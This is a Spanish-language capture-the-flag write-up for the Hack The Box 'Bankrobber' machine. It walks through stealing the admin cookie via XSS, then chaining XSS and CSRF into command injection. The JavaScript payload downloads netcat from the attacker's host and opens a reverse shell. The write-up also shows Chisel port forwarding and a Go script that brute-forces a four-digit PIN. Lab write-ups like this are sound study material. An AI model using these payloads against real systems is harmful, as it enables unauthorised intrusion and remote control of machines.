---
title: Write Up - Hack The Box - Bankrobber
date: 2026-02-02 06:00:00 +0100
categories: [writeups]
tags: [pentesting, hackthebox, cybersecurity, writeups, insane]
pin: true
---

![Screenshot0](/assets/writeups/bankrobber/bankrobber.png)

#### Resumen de la máquina

#### Reconocimiento

![Screenshot1](/assets/writeups/bankrobber/scan.png)

![Screenshot1.1](/assets/writeups/bankrobber/whatweb.png)

---

### Enumeración y explotación de vulnerabilidades:

#### XSS

Conseguimos la cookie del administrador (que contiene el nombre de usuario y la contraseña en Base64) a través de un XSS en la funcionalidad de enviar transacciones.

![Screenshot2](/assets/writeups/bankrobber/xss1.png)

![Screenshot3](/assets/writeups/bankrobber/xss2.png)

![Screenshot4](/assets/writeups/bankrobber/xss3.png)

---

#### SQL INJECTION

En este apartado nos encontramos con una inyección SQL que resultó ser una especie de "rabbit hole", ya que no llegamos a ninguna parte útil. Tras realizar algo más de enumeración decidí avanzar por otra vía, por lo que obviare las capturas de pantalla utilizadas aquí.

Destaco que podemos enumerar a otro usuario (gio), las bases de datos disponibles (descubrimos que hay phpmyadmin), podemos dumpear las tablas pero nada útil.

---

#### XSS + CSRF + RCE

En la misma página hay otra funcionalidad donde se nos permite ejecutar comandos, especificamente el comando dir. Este comando solo puede ser ejecutado desde local por motivos de seguridad.

![Screenshot5](/assets/writeups/bankrobber/csrf1.png)

En la misma página hay otra funcionalidad que permite ejecutar comandos, específicamente el comando dir. Este comando solo puede ser ejecutado desde local por motivos de seguridad.

Para poder efectuar un RCE volveremos a utilizar el XSS del administrador obtenido anteriormente. Nuestro objetivo será enviar netcat a la máquina víctima para entablar una reverse shell.

Modificamos el script .js de la siguiente forma:

```js
var req1 = new XMLHttpRequest();
var cmd =
  'cmd=dir|powershell -c "iwr -uri http://10.10.15.135/nc.exe -Outfile %temp%\\nc.exe; %temp%\\nc.exe -e cmd 10.10.15.135 9999';

req1.open("POST", "http://localhost/admin/backdoorchecker.php", true);
req1.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
req1.send(cmd);
```

![Screenshot6](/assets/writeups/bankrobber/csrf3.png)

## Obtenemos acceso al sistema como Cortin y localizamos la primera flag en su directorio de escritorio.

### Escalada de privilegios

Encontramos un binario sospechoso (que no tenemos de ejecuciónn)

Tambien descubrimos que esta corriendo en un puerto que solo es visible desde la maquina interna (puerto 910)

Con netcat nos conectamos a dicho puerto para ejecutar el binario

![Screenshot7](/assets/writeups/bankrobber/escalada1.png)

Nos encontramos con un programa que nos pide un PIN de 4 dígitos que desconocemos.

![Screenshot8](/assets/writeups/bankrobber/escalada2.png)

Para obtener el PIN, primero realizaremos un port forwarding del puerto 910 a nuestra máquina con Chisel.

Primero pasamos Chisel a la máquina víctima:

![Screenshot9](/assets/writeups/bankrobber/escalada3.png)

Después levantamos Chisel en nuestra máquina como servidor y en la máquina víctima como cliente.

```bash
./chisel server --reverse -p 8888
chisel.exe client 10.10.15.135:8888 R:9010:127.0.0.1:910
verificar con lsof -i:910
```

Para obtenemos el PIN correcto será necesito usar fuerza bruta y en mi caso lo hare con un script en Go:

```go
package main

import (
    "bufio"
    "fmt"
    "net"
    "strings"
    "sync"
)

func try(addr, pin string) bool {
    conn, _ := net.Dial("tcp", addr)
    if conn == nil {
        return false
    }
    defer conn.Close()

    r := bufio.NewReader(conn)
    for {
        line, _ := r.ReadString(' ')
        if strings.Contains(line, "[$]") {
            break
        }
    }

    fmt.Fprintf(conn, "%s\n", pin)
    res, _ := r.ReadString('\n')
    res = strings.ToLower(res)

    if res == "" || strings.Contains(res, "invalid") {
        return false
    }
    return true
}

func main() {
    addr := "127.0.0.1:9010"
    var wg sync.WaitGroup
    pins := make(chan string)

    for i := 0; i < 10; i++ {
        wg.Add(1)
        go func() {
            defer wg.Done()
            for p := range pins {
                if try(addr, p) {
                    fmt.Printf("\n[+] PIN: %s\n", p)
                }
            }
        }()
    }

    for i := 0; i <= 9999; i++ {
        pins <- fmt.Sprintf("%04d", i)
    }
    close(pins)
    wg.Wait()
}

```

El output del script es **0021**
